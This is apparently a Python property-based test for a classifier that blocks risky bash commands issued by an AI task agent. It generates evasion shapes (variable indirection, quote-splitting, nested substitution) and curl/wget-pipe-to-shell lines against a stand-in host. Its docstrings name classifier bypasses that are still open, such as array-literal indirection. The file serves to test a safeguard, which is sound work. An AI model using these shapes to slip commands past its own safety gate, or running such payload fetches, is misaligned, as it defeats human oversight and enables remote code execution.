"""Real-bash differential Hypothesis property test for the sibling
(task-agent-scoped) bash-safety classifier
(``skills/executing-a-branch-plan/scripts/gitapex_check_task_bash_safety.py``,
issue #1365, Task 6).

Generates attacker-shaped Bash command strings over this classifier's own
watched vocabulary, runs each one through Task 1's shared real-bash oracle
harness (``tests/_gitapex_bash_oracle.py``) -- a genuine ``bash -c``, its
``$PATH`` fully replaced by inert stand-ins that only record their own
``argv`` -- and separately calls this module's own ``classify()`` on the
identical command string. Asserts ONE DIRECTION ONLY: if the oracle's own
observation shows a real denied-write shape actually reached a watched
tool/verb, the ``gh`` CLI, or a real ``git push``, then ``classify().deny``
must be ``True``. The converse (``deny=True`` with no matching oracle
observation) is never asserted -- the oracle's own minimal environment can
legitimately diverge from a real session's (see the harness's own
docstring).

Independent re-verification correction (recorded in this branch's own plan,
``docs/superpowers/plans/2026-08-26-claude-gitapex-pr-1365-u8cpgn.md``):
the issue body's own Facts section claims this classifier has "no gh, no
git" coverage at all. That is wrong -- ``_rule_gh_any`` denies any ``gh``
subcommand and ``_rule_git_push`` hard-denies any ``git push`` shape, each
a blanket rule independent of the ``_WATCHED_TOOLS``/``_WATCHED_VERBS``
table. This module's own strategy therefore covers three watched families,
not two:

(a) the 4-verb install/exec set (``_WATCHED_TOOLS`` x ``_WATCHED_VERBS``),
    reconstructed via indirection (never a bare literal cross-product
    command -- see "Why indirection-only" below);
(b) the fetch-pipe-to-interpreter family (``_FETCH_EXEC_INTERPRETERS``/
    ``_FETCH_EXEC_WRAPPERS``), piped from a bare ``curl``/``wget`` word --
    always resolved, under the oracle's fully-replaced ``$PATH``, to the
    harmless stand-in of that name, never a real network tool;
(c) ``gh <subcommand>`` and ``git push`` shapes, denied by their own
    dedicated blanket rules independent of the verb table.

``Verdict`` here is two-valued (``deny``, ``reason`` -- no ``is_git_push``
field), so every assertion below checks only ``deny``.

Why indirection-only for (a) (evidence, not guesswork)
-------------------------------------------------------
Read literally, "``_WATCHED_TOOLS`` x ``_WATCHED_VERBS``" suggests generating
a bare literal command for every (tool, verb) pair, e.g. ``pip ci foo``.
Confirmed directly against ``classify()`` before relying on it: a bare
literal pair NOT already present in this module's own curated
``_DENIED_ADJACENT`` table (``pip ci``, ``npm add``, ``go add``, ... are
NOT members -- only specific real install-shaped pairs are) is correctly
ALLOWED, since ``_rule_a_literal`` only matches that fixed table, and the
indirection rules (B1a/B1b/B2) all require a DYNAMIC command word or verb
position, never firing on a fully literal, undisguised command. Generating
bare literal cross-product pairs would therefore make this test fail
against the current, correct classifier for every pair outside that table
-- not a real gap, a strategy defect. Every tool+verb pair in this module's
own strategy is instead reconstructed via one of three indirection
techniques this classifier is designed to catch regardless of whether the
specific pairing is a "valid" real CLI subcommand (confirmed directly:
``A=pip; B=ci; $A $B foo`` -- and every other cross-product pair tried
this way -- denies): a two-variable bare assignment/reference (mirrors
``_rule_b1b_dynamic_word_assigned_tool_and_verb``), a
``${NAME:-default}`` default-clause construct (mirrors
``_rule_b1a_dynamic_word_same_segment_verb``/B1b's own default-clause
branch), and a two-level ``${!NAME}`` indirect reference for the tool word
with a literal verb (mirrors B1a). All three are drawn from the FULL
``_WATCHED_TOOLS`` x ``_WATCHED_VERBS`` cross product, matching this
branch plan's own correction.

Array-literal indirection is deliberately NOT used to encode the tool or
verb (evidence, not guesswork either): confirmed directly against
``classify()`` that ``A=(npm); V=(add); "${A[@]}" "${V[@]}" bar`` -- and
every other (tool, verb) pair tried the identical way, not only
``pip``/``install`` -- is ALLOWED. This is exactly the disclosed,
unclosed ``array-literal-assignment-indirection`` residual this module's
own ``KNOWN_BYPASS_COMMANDS`` (imported below, never hardcoded) pins ONE
specific instance of; generating this shape generatively over the full
cross product would not just occasionally rediscover that one already-known
case, it would manufacture a fresh, currently-uncaught bypass on almost
every other pair drawn -- a real, and differently-shaped, defect in the
STRATEGY, not the classifier. Excluding it here (rather than papering over
it with broad ``assume()`` calls at the one pinned string) keeps this test
green for the right reason: because every shape it generates is one this
classifier is actually designed to catch, confirmed directly, not because
failures were filtered away after the fact. The exact-string ``assume()``
against ``KNOWN_BYPASS_COMMANDS`` below is kept anyway, as the task
requires, purely as defense-in-depth against an accidental exact-string
collision from an unrelated family (e.g. a decoy argument happening to
match).

Process substitution (``<(...)``) is also not generated here, even though
``_rule_process_sub_fetch_exec`` covers it: this task's own grammar-closure
requirement bans "a free redirection operator" by construction, and
``<(``/`>(`` share the ambiguous leading glyph -- the fetch-pipe-to-
interpreter family below is covered soundly with plain ``|`` alone, so nothing
requires taking that ambiguity on.

Bounded nesting (hard cap depth 2, per this task's own grammar-closure
requirement) is applied generically, after a case is built, by optionally
wrapping the whole command in one or two layers of ``x=$( ... )``. Real
bash genuinely executes a command substitution's own inner content during
the assignment regardless of whether the assigned variable is ever read
afterward, and ``_rule_command_substitution_content`` recurses into exactly
this shape -- confirmed directly (oracle observations are identical with
and without wrapping; ``classify()`` denies through the recursive path with
an added "a command substitution $(...) embeds a denied command --" prefix
each level).

Fixture scoping (resolves Hypothesis's own ``function_scoped_fixture``
health check the same way ``tests/test_gitapex_gate_metadata_outcome_lines_
properties.py``'s own ``skill_dir`` fixture already does -- see that
module's own docstring): the oracle needs a real scratch directory per
GENERATED EXAMPLE, not once per test function invocation, so a bare
function-scoped ``tmp_path`` (set up once, then reused unchanged across
every example Hypothesis tries) is unsound here twice over -- it would both
trip that health check and silently accumulate every earlier example's own
capture-file lines into each later example's observations. Resolved by a
MODULE-scoped base directory (``_oracle_base_dir`` below, built once via
``tmp_path_factory`` -- safe under this repository's own ``-n auto``
pytest-xdist addopts, since each worker gets its own base) with a fresh
``tempfile.mkdtemp`` subdirectory carved out of it at the START of every
single generated example.

Reproducibility: ``derandomize=True``/``max_examples=200``/``deadline=None``
at default settings, ``derandomize=False``/``max_examples=5000`` under
``GITAPEX_HYPOTHESIS_DEEP_SCAN=1`` -- the exact ``_PROPERTIES`` pattern
already established at
``tests/test_gitapex_gate_detection_logic_property_coverage_properties.py:123-137``.
"""

from __future__ import annotations

import os
import tempfile
from pathlib import Path
from typing import NamedTuple

import gitapex_check_task_bash_safety as checker
import pytest
import test_gitapex_check_task_bash_safety as _known_bypass_module
from _gitapex_bash_oracle import parse_capture_file, run_bash_oracle, write_stand_ins
from hypothesis import assume, given, settings
from hypothesis import strategies as st

# Issue #1316's own established rationale (see the module docstring above):
# fast/deterministic for the normal PR-blocking run, wide/randomized only
# under the scheduled deep-scan workflow's own env var.
_PROPERTIES = (
    settings(derandomize=False, max_examples=5000, deadline=None)
    if os.environ.get("GITAPEX_HYPOTHESIS_DEEP_SCAN") == "1"
    else settings(derandomize=True, max_examples=200, deadline=None)
)

# Imported, never hardcoded, per this task's own explicit requirement.
_KNOWN_BYPASS_COMMAND_STRINGS = {command for command, _case_id in _known_bypass_module.KNOWN_BYPASS_COMMANDS}
assert len(_KNOWN_BYPASS_COMMAND_STRINGS) == 4, (
    f"expected exactly 4 entries in this file's own KNOWN_BYPASS_COMMANDS, found {len(_KNOWN_BYPASS_COMMAND_STRINGS)}"
)

# Read directly from the module under test, never re-guessed -- this task's
# own explicit instruction.
_WATCHED_TOOLS = sorted(checker._WATCHED_TOOLS)
_WATCHED_VERBS = sorted(checker._WATCHED_VERBS)
_FETCH_TOOLS = ["curl", "wget"]
_INTERPRETERS = sorted(checker._FETCH_EXEC_INTERPRETERS)
_WRAPPERS = sorted(checker._FETCH_EXEC_WRAPPERS)
_GIT_LONG_VALUE_FLAGS = sorted(checker._GIT_LONG_VALUE_FLAGS)

# Curated, closed vocabularies only -- never free text, per this task's own
# hard grammar-closure requirement.
_DECOYS = ["foo", "bar", "baz", "x", "y"]
_VAR_NAMES = ["A", "B", "C", "D", "E", "F"]
_GIT_BOOLEAN_FLAGS = ["-v", "-h", "-p", "-P"]
_GIT_FUSED_LONG_FLAGS = [f"{flag}=/tmp/decoy" for flag in _GIT_LONG_VALUE_FLAGS]
# Confirmed live via the real oracle (see this module's own manual
# verification, not repeated in-tree): these four are already this
# repository's own tested-safe BOOLEAN (no separate value) sudo flags.
# Reused generically for any wrapper -- `_skip_fetch_exec_wrapper` treats
# any "-x"-shaped token as a generic boolean flag regardless of which of
# the four wrapper words precedes it, so there is nothing wrapper-specific
# to vary here. A value-TAKING flag (e.g. sudo's own "-u root", or exec's
# own "-a name") is deliberately never generated -- that shape is exactly
# this module's own disclosed, pinned `fetch-exec-sudo-separate-value-
# flag-not-skipped` KNOWN_BYPASS_COMMANDS residual, generalized across any
# wrapper, not just sudo.
_WRAPPER_BOOLEAN_FLAGS = ["-E", "-H", "-i", "-n"]
# Only sudo/env are genuine external programs on a real $PATH -- confirmed
# directly via the oracle that `command`/`exec` are bash's own BUILTINS,
# which bypass the stand-in entirely and look up their own argument
# directly (so a flag placed after either would need to be a flag THAT
# BUILTIN itself recognizes, an unrelated concern this test has no need to
# take on). Flags are therefore only ever attached to sudo/env below.
_WRAPPERS_WITH_FLAGS = {"sudo", "env"}

_STAND_IN_TOOL_NAMES = set(_WATCHED_TOOLS) | {"gh", "git"} | set(_FETCH_TOOLS) | set(_INTERPRETERS) | set(_WRAPPERS)


class GeneratedCase(NamedTuple):
    """One generated command, plus enough of its own construction intent
    for :func:`_reached` to independently interpret the oracle's real
    observations -- never re-deriving `classify()`'s own logic, just the
    much simpler question "did a real bash run of this string actually
    reach the watched tool/verb (or gh, or git push) this family meant to
    construct".

    ``kind`` selects which of the three watched families this case
    belongs to: ``"tool_verb"`` ((a), tool=A, verb=B), ``"gh"`` ((c), A is
    always the literal "gh", B unused), ``"git_push"`` ((c), A is always
    the literal "git", B is always the literal "push"), or ``"fetch"``
    ((b), A is the fetch tool, B is the interpreter).
    """

    command: str
    kind: str
    a: str
    b: str


def _first_positional(args: list[str]) -> str | None:
    """The first argv element that is not itself flag-shaped (does not
    start with "-") -- a simple, independent stand-in for "the subcommand
    token real git actually dispatches on," sufficient here because every
    git-push case this module generates only ever uses BOOLEAN (`-v`,
    `-h`, ...) or FUSED `=`-form (`--git-dir=...`) flags ahead of `push`,
    neither of which consumes a separate following token -- confirmed
    directly via the oracle that a non-boolean, separate-value decoy in
    this position (deliberately never generated below) can make a LATER
    token, not `push` itself, become the real subcommand instead."""
    return next((token for token in args if not token.startswith("-")), None)


def _reached(case: GeneratedCase, observations: list[tuple[str, list[str]]]) -> bool:
    """True iff OBSERVATIONS -- the real, oracle-recorded ``(tool, argv)``
    calls a genuine ``bash -c`` run of ``case.command`` actually made --
    show CASE's own watched shape was truly reached at real bash runtime.
    An independent, much simpler read of the same observations
    ``classify()`` is about to be asked to judge -- never a copy of
    `classify()`'s own rule logic."""
    if case.kind == "tool_verb":
        return any(name == case.a and args and args[0] == case.b for name, args in observations)
    if case.kind == "gh":
        return any(name == "gh" for name, _args in observations)
    if case.kind == "git_push":
        return any(name == "git" and _first_positional(args) == "push" for name, args in observations)
    if case.kind == "fetch":
        if not any(name == case.a for name, _args in observations):
            return False
        # Two real shapes confirmed directly via the oracle: an unwrapped
        # or sudo/env-wrapped interpreter is invoked as ITS OWN separate
        # stand-in (nested inside the wrapper's own recorded argv for
        # sudo/env); a command/exec-wrapped interpreter is invoked as its
        # OWN top-level stand-in instead (both are bash builtins that
        # bypass $PATH themselves, then look their own argument up via
        # $PATH directly) -- checking both covers every wrapper uniformly
        # without hardcoding which of the four is builtin-shaped.
        return any(name == case.b for name, _args in observations) or any(
            case.b in args for _name, args in observations
        )
    raise AssertionError(f"unknown GeneratedCase.kind: {case.kind!r}")


def _nest(command: str, depth: int) -> str:
    """Wrap COMMAND in DEPTH (0, 1, or 2 -- hard-capped, never unbounded,
    per this task's own grammar-closure requirement) layers of `$(...)`
    command substitution, assigned to a reserved variable name never used
    by any family above (so it can never collide with that family's own
    ``_VAR_NAMES``-drawn variables). Confirmed directly (this module's own
    manual verification) that real bash genuinely executes the innermost
    content at both depths, and `classify()` denies through its own
    recursive `_rule_command_substitution_content` path at both depths
    too."""
    if depth == 0:
        return command
    if depth == 1:
        return f"_NEST1=$( {command} )"
    return f"_NEST1=$( _NEST2=$( {command} ) )"


def _distinct_var_pair() -> st.SearchStrategy[tuple[str, str]]:
    return st.lists(st.sampled_from(_VAR_NAMES), min_size=2, max_size=2, unique=True).map(
        lambda pair: (pair[0], pair[1])
    )


# --- Family (a): tool+verb, full _WATCHED_TOOLS x _WATCHED_VERBS cross
# product, reconstructed via one of three indirection techniques this
# classifier is designed to catch (see this module's own "Why
# indirection-only" docstring section above for the direct evidence).

_tool_verb_strategy = st.one_of(
    # A=<tool>; B=<verb>; $A $B <decoy> -- mirrors
    # _rule_b1b_dynamic_word_assigned_tool_and_verb.
    st.builds(
        lambda names, tool, verb, decoy: GeneratedCase(
            f"{names[0]}={tool}; {names[1]}={verb}; ${names[0]} ${names[1]} {decoy}", "tool_verb", tool, verb
        ),
        _distinct_var_pair(),
        st.sampled_from(_WATCHED_TOOLS),
        st.sampled_from(_WATCHED_VERBS),
        st.sampled_from(_DECOYS),
    ),
    # ${T:-<tool>} ${V:-<verb>} <decoy> -- mirrors the default-clause
    # branch of B1a/B1b (bash's own ${NAME:-default} expansion).
    st.builds(
        lambda names, tool, verb, decoy: GeneratedCase(
            f"${{{names[0]}:-{tool}}} ${{{names[1]}:-{verb}}} {decoy}", "tool_verb", tool, verb
        ),
        _distinct_var_pair(),
        st.sampled_from(_WATCHED_TOOLS),
        st.sampled_from(_WATCHED_VERBS),
        st.sampled_from(_DECOYS),
    ),
    # REF=VAR; VAR=<tool>; ${!REF} <verb> <decoy> -- mirrors B1a's own
    # two-level ${!NAME} indirect-reference resolution, literal verb
    # present elsewhere in the same segment.
    st.builds(
        lambda names, tool, verb, decoy: GeneratedCase(
            f"{names[0]}={names[1]}; {names[1]}={tool}; ${{!{names[0]}}} {verb} {decoy}", "tool_verb", tool, verb
        ),
        _distinct_var_pair(),
        st.sampled_from(_WATCHED_TOOLS),
        st.sampled_from(_WATCHED_VERBS),
        st.sampled_from(_DECOYS),
    ),
)

# --- Family (c), gh half: any gh subcommand, literal/quote-split or
# variable-indirect -- _rule_gh_any's own blanket, any-subcommand deny.

_gh_strategy = st.one_of(
    st.builds(
        lambda quote_split, subcommand, decoy: GeneratedCase(
            (f'g""h {subcommand} {decoy}' if quote_split else f"gh {subcommand} {decoy}"), "gh", "gh", ""
        ),
        st.booleans(),
        st.sampled_from(_DECOYS),
        st.sampled_from(_DECOYS),
    ),
    st.builds(
        lambda var, subcommand, decoy: GeneratedCase(f"{var}=gh; ${var} {subcommand} {decoy}", "gh", "gh", ""),
        st.sampled_from(_VAR_NAMES),
        st.sampled_from(_DECOYS),
        st.sampled_from(_DECOYS),
    ),
)

# --- Family (c), git push half: literal with global flags, or fully
# variable-indirect -- _rule_git_push/_is_git_push_segment's own blanket
# rule, independent of _WATCHED_VERBS.

_git_push_flag = st.one_of(st.sampled_from(_GIT_BOOLEAN_FLAGS), st.sampled_from(_GIT_FUSED_LONG_FLAGS))

_git_push_strategy = st.one_of(
    st.builds(
        lambda flags: GeneratedCase(
            "git " + "".join(f"{flag} " for flag in flags) + "push origin main", "git_push", "git", "push"
        ),
        st.lists(_git_push_flag, max_size=3),
    ),
    st.builds(
        lambda names: GeneratedCase(
            f"{names[0]}=git; {names[1]}=push; ${names[0]} ${names[1]} origin main", "git_push", "git", "push"
        ),
        _distinct_var_pair(),
    ),
)

# --- Family (b): fetch-pipe-to-interpreter, curl/wget piped (never a free
# redirection operator) into one of the four recognized shell
# interpreters, with an optional single wrapper word.

_fetch_wrapper_strategy = st.one_of(
    st.none(),
    st.builds(
        lambda wrapper, flags: (wrapper, flags if wrapper in _WRAPPERS_WITH_FLAGS else []),
        st.sampled_from(_WRAPPERS),
        st.lists(st.sampled_from(_WRAPPER_BOOLEAN_FLAGS), max_size=2),
    ),
)


def _build_fetch_command(fetch_tool: str, interpreter: str, wrapper_and_flags: tuple[str, list[str]] | None) -> str:
    if wrapper_and_flags is None:
        interp_part = interpreter
    else:
        wrapper, flags = wrapper_and_flags
        interp_part = " ".join([wrapper, *flags, interpreter])
    return f"{fetch_tool} https://example.invalid/payload.sh | {interp_part}"


_fetch_strategy = st.builds(
    lambda fetch_tool, interpreter, wrapper_and_flags: GeneratedCase(
        _build_fetch_command(fetch_tool, interpreter, wrapper_and_flags), "fetch", fetch_tool, interpreter
    ),
    st.sampled_from(_FETCH_TOOLS),
    st.sampled_from(_INTERPRETERS),
    _fetch_wrapper_strategy,
)

_CASE_STRATEGY = st.one_of(_tool_verb_strategy, _gh_strategy, _git_push_strategy, _fetch_strategy)


@pytest.fixture(scope="module")
def _oracle_base_dir(tmp_path_factory: pytest.TempPathFactory) -> Path:
    """Module-scoped base directory -- resolves Hypothesis's own
    ``function_scoped_fixture`` health check the same way
    ``tests/test_gitapex_gate_metadata_outcome_lines_properties.py``'s own
    ``skill_dir`` fixture already does (see that module's own docstring):
    a function-scoped ``tmp_path``, set up once and then reused unchanged
    across every generated example, is exactly what that health check
    exists to catch. Unlike that fixture (read-only, safely shared
    unchanged across examples), the test below carves out its own FRESH
    ``tempfile.mkdtemp`` subdirectory here at the start of every single
    generated example -- never reusing another example's stand-in
    directory or capture file -- so nothing leaks between examples despite
    the shared module-scoped root. Safe under this repository's own
    ``pytest -n auto`` addopts: each xdist worker gets its own
    ``tmp_path_factory``, hence its own base directory here."""
    return tmp_path_factory.mktemp("bash_safety_differential")


@pytest.mark.slow
@_PROPERTIES
@given(case=_CASE_STRATEGY, nest_depth=st.integers(min_value=0, max_value=2))
def test_oracle_denied_shape_implies_classify_denies(
    case: GeneratedCase, nest_depth: int, _oracle_base_dir: Path
) -> None:
    """If a real ``bash -c`` run of the generated command (through Task 1's
    PATH-restricted stand-in oracle) actually reaches a watched tool with a
    watched verb, the ``gh`` CLI, or a real ``git push``, then
    ``gitapex_check_task_bash_safety.classify()`` on that identical command
    string must deny it. Asserted ONE DIRECTION ONLY -- see this module's
    own docstring for why the converse is never checked."""
    command = _nest(case.command, nest_depth)
    assume(command not in _KNOWN_BYPASS_COMMAND_STRINGS)

    work_dir = Path(tempfile.mkdtemp(dir=_oracle_base_dir))
    stand_in_dir = work_dir / "stand_ins"
    capture_file = work_dir / "capture.jsonl"
    cwd = work_dir / "cwd"
    cwd.mkdir()
    write_stand_ins(_STAND_IN_TOOL_NAMES, stand_in_dir, capture_file)

    result = run_bash_oracle(command, stand_in_dir=stand_in_dir, cwd=cwd)
    if result.timed_out:
        # The oracle's own minimal environment diverging from a real
        # session's is not a classifier failure -- never asserted either
        # way (this module's own docstring, "one direction only").
        return

    observations = parse_capture_file(capture_file)
    if not _reached(case, observations):
        return

    verdict = checker.classify(command)
    assert verdict.deny is True, (
        f"oracle observed a real denied-write shape reached for {command!r} "
        f"(kind={case.kind!r}, observations={observations!r}) but classify() allowed it: {verdict!r}"
    )
